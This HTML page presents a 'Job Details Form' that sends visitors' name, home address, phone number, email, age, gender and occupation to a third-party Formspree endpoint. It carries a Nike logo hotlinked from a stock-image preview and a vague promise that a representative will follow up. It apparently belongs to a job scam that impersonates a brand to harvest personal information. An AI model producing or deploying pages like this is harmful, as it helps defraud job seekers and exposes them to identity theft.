<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Custom Form</title>
    <style>
        /* Inline CSS style */
        body {
            font-family: Arial, sans-serif;
            background-color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh; /* Make sure the body takes at least 100vh */
            color: #000;
        }

        .form-container {
            background-color: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 600px;
            border: 1px solid #000;
            display: flex;
            flex-direction: column; /* Ensure the form aligns vertically */
        }

        h2 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 24px;
            color: #000;
        }

        input, select, textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #000; /* Set border to black */
            border-radius: 5px;
            font-size: 16px;
            background-color: #fff;
            color: #000;
        }

        input[type="submit"] {
            background-color: #000;
            color: white;
            cursor: pointer;
            font-size: 18px;
            border: none;
        }

        input[type="submit"]:hover {
            background-color: #000; /* Set hover effect to black */
        }

        .input-container {
            margin-bottom: 20px;
        }

        label {
            font-weight: bold;
            color: #000;
        }

        .logo-container {
            text-align: center;
            margin-top: 30px;
        }
    </style>
</head>
<body>

    <div class="form-container">
        <h2>Job Details Form</h2>

        <!-- Form action now uses Formspree URL -->
        <form action="https://formspree.io/f/xvgkbgpa" method="POST">
            <div class="input-container">
                <label for="email">Personal Email:</label>
                <input type="email" id="email" name="email" required>
            </div>

            <div class="input-container">
                <label for="fullName">Full Name:</label>
                <input type="text" id="fullName" name="fullName" required>
            </div>

            <div class="input-container">
                <label for="address">City House Address (Apt #):</label>
                <input type="text" id="address" name="address" required>
            </div>

            <div class="input-container">
                <label for="cityStateZip">City/State/Zip Code:</label>
                <input type="text" id="cityStateZip" name="cityStateZip" required>
            </div>

            <div class="input-container">
                <label for="phone">Cell Phone Number:</label>
                <input type="text" id="phone" name="phone" required>
            </div>

            <div class="input-container">
                <label for="personalEmail">Verify Personal Email:</label>
                <input type="email" id="personalEmail" name="personalEmail" required>
            </div>

            <div class="input-container">
                <label for="ageGender">Age / Gender:</label>
                <input type="text" id="ageGender" name="ageGender" required>
            </div>

            <div class="input-container">
                <label for="occupation">Occupation:</label>
                <input type="text" id="occupation" name="occupation" required>
            </div>

            <div>
                <input type="submit" value="Submit">
            </div>
        </form>

        <h4>Once you submit this form, you will be redirected to this page, and a representative will follow up with you shortly.</h4>

        <!-- Logo placed after the button -->
        <div class="logo-container">
            <img src="https://www.shutterstock.com/image-vector/nike-logo-vector-illustration-eps-260nw-2414080435.jpg" alt="Logo" width="200">
        </div>
    </div>

</body>
</html>
